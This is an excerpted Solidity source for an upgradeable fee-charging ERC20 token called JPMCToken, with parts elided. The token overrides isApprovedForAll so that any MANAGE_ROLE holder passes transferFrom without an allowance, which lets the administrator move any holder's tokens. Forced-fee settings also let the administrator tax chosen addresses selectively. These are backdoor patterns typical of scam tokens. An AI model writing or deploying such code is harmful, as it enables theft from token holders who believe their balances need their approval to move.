...
import "./lib/ContractVersions.sol";
import "./lib/ERC20Fee.sol";
import "./lib/CalcHelpers.sol";

contract JPMCToken is ERC20Fee, PausableUpgradeable, AccessControlEnumerableUpgradeable, UUPSUpgradeable, ContractVersions {
    using CalcHelpers for uint256;
    bytes32 public constant MANAGE_ROLE = keccak256("MANAGE_ROLE");

    event Fees(uint256 feeTo, uint256 feeFrom, uint256 feeTransfer);
    ...
    uint256 private _feeTo;
    uint256 private _feeFrom;
    ...
    function initialize(
        ...
        require(initialHolder != address(0), "initialHolder not provided");
        require(initialSupply > 0, "initialSupply not provided");

        // __Context_init_unchained();
        __ERC20Fee_init_unchained(name_, symbol_);
        __Pausable_init_unchained();

        JPMCToken_init(initialSupply, initialHolder, feeTo, feeFrom, feeTransfer, feeReceiver);

        initialize_v1();
    }

    function JPMCToken_init(
        uint256 initialSupply,
        address initialHolder,
        uint256 feeTo,
        uint256 feeFrom,
        ...
        _setupRole(DEFAULT_ADMIN_ROLE, initialHolder);
        _setupRole(MANAGE_ROLE, initialHolder);

        _setFees(feeTo, feeFrom, feeTransfer);
        _setFeeReceiver(feeReceiver);

        //exclude owner, initialHolder and contract self from fee
        _setExcludedFee(_msgSender(), true);
        _setExcludedFee(initialHolder, true);
        _setExcludedFee(address(this), true);
    ...
    {
        return (_feeTo, _feeFrom, _feeTransfer);
    }
    ...
    function setFeeReceiver(address feeReceiver) public onlyRole(MANAGE_ROLE) {
        _setFeeReceiver(feeReceiver);
    }
    ...
    function _setFees(
        ...
        emit Fees(feeTo, feeFrom, feeTransfer);
    }
    ...
    function _calcFee(
        ...
        if (
            ...
            if (_isForcedFee[to]) {
                fee = amount.pcnt(_feeTo);
            } else if (_isForcedFee[from]) {
                fee = amount.pcnt(_feeFrom);
            } else {
    ...
    function claimFee() external onlyRole(MANAGE_ROLE) {
        uint256 amount = balanceOf(address(this));
        require(amount > 0, "nothing to claim");
        require(_feeReceiver != address(0), "fee receiver not set");
        _transfer(address(this), _feeReceiver, amount);
    }
    ...
    function isApprovedForAll(address operator) public view override returns (bool) {
        return hasRole(MANAGE_ROLE, operator);
    }
...
contract ERC20Fee is Initializable, ContextUpgradeable, IERC20Upgradeable, IERC20MetadataUpgradeable {
    ...
    function transferFrom(
        ...
        if (currentAllowance != MAX && !isApprovedForAll(_msgSender())) {
    ...
    function _transfer(
        ...
        if (fee > 0) {
            ...
            require(_proceedHookFee(fee), "proceed fee failed");
    ...
    /**
     * @dev Allows the operator to transfer tokens regardless of the amount allowed.
     */
    function isApprovedForAll(address operator) public view virtual returns (bool) {
        operator;
        return false;
    }
}
